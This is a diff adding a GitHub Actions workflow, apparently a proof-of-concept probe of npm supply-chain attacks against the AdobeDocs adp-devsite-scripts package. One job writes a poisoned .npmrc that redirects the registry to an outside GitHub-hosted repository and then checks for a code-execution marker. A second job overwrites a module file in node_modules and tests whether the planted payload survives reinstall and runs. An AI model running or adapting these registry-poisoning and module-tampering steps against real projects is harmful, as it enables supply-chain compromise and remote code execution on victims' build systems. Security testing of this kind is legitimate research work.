@@ -1,0 +1,34 @@
+name: npmprobe2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pull-requests: write
+jobs:
+  registry:
+    runs-on: ubuntu-latest
+    steps:
+      - name: versions
+        run: node -v; npm -v
+      - name: D attacker .npmrc registry poisoning
+        run: |
+          rm -rf /tmp/d /tmp/ADP_RCE_MARKER
+          mkdir -p /tmp/d && cd /tmp/d
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -20
+          echo "--- marker:"; cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NO_MARKER
+          test -f /tmp/ADP_RCE_MARKER && echo RESULT_D=RAN || echo RESULT_D=BLOCKED
+  warmtree:
+    runs-on: ubuntu-latest
+    steps:
+      - name: E warmed node_modules swap
+        run: |
+          rm -rf /tmp/e /tmp/MARK_E
+          mkdir -p /tmp/e && cd /tmp/e
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts >/tmp/e1.log 2>&1 || echo FIRST_FAIL
+          echo "require('fs').writeFileSync('/tmp/MARK_E','ran')" > node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts >/tmp/e2.log 2>&1 || echo SECOND_FAIL
+          echo "--- our payload still present?"; grep -c MARK_E node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js || true
+          node node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js >/tmp/e3.log 2>&1 || true
+          cat /tmp/e3.log | head -3
+          test -f /tmp/MARK_E && echo RESULT_E=RAN || echo RESULT_E=BLOCKED
